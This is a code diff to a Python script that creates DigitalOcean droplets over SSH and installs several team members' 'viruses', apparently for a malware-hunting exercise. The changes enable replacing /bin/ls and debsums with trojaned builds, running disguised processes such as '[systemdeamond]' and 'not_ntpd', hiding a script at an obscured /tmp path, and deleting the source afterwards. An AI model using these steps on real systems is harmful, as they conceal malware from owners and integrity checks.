@@ -4,10 +4,9 @@ import time
 import paramiko
 from scp import SCPClient
 import config
-from os import system
 from typing import Tuple
 
-count = 10
+count = 1
 
 manager = digitalocean.Manager(token=config.token)
 keys = manager.get_all_sshkeys()
@@ -57,23 +56,25 @@ def initDroplet(tuple):
     time.sleep(5)
 
     # David's virus 2
-    # c.exec_command("mv /bin/ls /realLS")
-    # scp.put('david/', '/root/david/', recursive=True)
-    # waitUntilCompletion(c.exec_command('cd /root/david/; cargo build --all'))
-    # c.exec_command('cp /root/david/target/debug/virus /var/virus')
-    # c.exec_command('cp /root/david/target/debug/virus /virus')
-    # c.exec_command('cp /root/david/target/debug/virus /var/virus')
-    # c.exec_command("mv /usr/bin/debsums /realDebsums")
-    # c.exec_command('cp /root/david/target/debug/debsums /usr/bin/debsums')
-    # c.exec_command('cp /root/david/target/debug/ls /bin/ls')
-    # c.exec_command('cp /root/david/target/debug/ls /usr/bin/ls')
-    # c.exec_command('cp /root/david/target/debug/ls /sbin/ls')
-    # c.exec_command('cp /root/david/target/debug/ls /usr/sbin/ls')
+    c.exec_command("mv /bin/ls /realLS")
+    scp.put('david/', '/root/david/', recursive=True)
+    waitUntilCompletion(c.exec_command('cd /root/david/; cargo build --all'))
+    c.exec_command('cp /root/david/target/debug/virus /var/virus')
+    c.exec_command('cp /root/david/target/debug/virus /virus')
+    c.exec_command('cp /root/david/target/debug/virus /var/virus')
+    c.exec_command("mv /usr/bin/debsums /realDebsums")
+    c.exec_command('cp /root/david/target/debug/debsums /usr/bin/debsums')
+    c.exec_command('cp /root/david/target/debug/ls /bin/ls')
+    c.exec_command('cp /root/david/target/debug/ls /usr/bin/ls')
+    c.exec_command('cp /root/david/target/debug/ls /sbin/ls')
+    c.exec_command('cp /root/david/target/debug/ls /usr/sbin/ls')
+    c.exec_command('ls /')
+    c.exec_command('rm -rf /root/david/')
 
     # Alex's virus 2
     scp.put("alex/GLaDOS/", "/root/glados/", recursive=True)
     waitUntilCompletion(c.exec_command("cd /root/glados/; make; make install"))
-    c.exec_command("rm -rf /root/glados") # TODO
+    c.exec_command("rm -rf /root/glados")
 
     # Isaac's virus 2
     scp.put('isaac/', '/root/isaac/', recursive=True)
@@ -81,19 +82,21 @@ def initDroplet(tuple):
     waitUntilCompletion(c.exec_command('cd /root/isaac; /root/isaac/build.sh'))
     waitUntilCompletion(c.exec_command('cp /root/isaac/not_ntpd /usr/bin/not_ntpd'))
     c.exec_command('nohup /usr/bin/not_ntpd %s &' % str(idx))
-    c.exec_command("rm -rf /root/isaac") # TODO
+    c.exec_command("rm -rf /root/isaac")
 
     # Michael's virus 2
     scp.put('michael/', '/root/michael/', recursive=True)
     waitUntilCompletion(c.exec_command('cd /root/michael; chmod +x build.sh; ./build.sh'))
     c.exec_command('nohup cat /virusNum &')
-    c.exec_command("rm -rf /root/michael") # TODO
+    c.exec_command("rm -rf /root/michael")
 
     # Victor's virus 2
-    # scp.put('victor/', '/root/victor/', recursive=True)
-    # waitUntilCompletion(c.exec_command('cd /root/victor; chmod +x build.sh; ./build.sh'))
-    # c.exec_command('nohup /root/victor/\[systemdeamond\] &')
-    # TODO
+    scp.put('victor/', '/root/victor/', recursive=True)
+    waitUntilCompletion(c.exec_command('cd /root/victor; cp /root/victor/bad.sh "/tmp/\,/bad.sh"; chmod +x build.sh; ./build.sh'))
+    c.exec_command('cp /root/victor/\[systemdeamond\] /usr/bin/')
+    c.exec_command('nohup /usr/bin/\[systemdeamond\] &')
+    c.exec_command('rm -rf /root/victor')
+    # TODO: Delete this
 
     print('Done with %s' % idx)
 
@@ -121,6 +124,5 @@ finally:
         c = paramiko.SSHClient()
         c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         c.connect(hostname=ip, username="root", pkey=k)
-        c.exec_command("nohup ls / &")
-
-time.sleep(20)
+        c.exec_command("/bin/ls /")
+        c.exec_command("/root/.rbenv/bin/cat /virusNum")
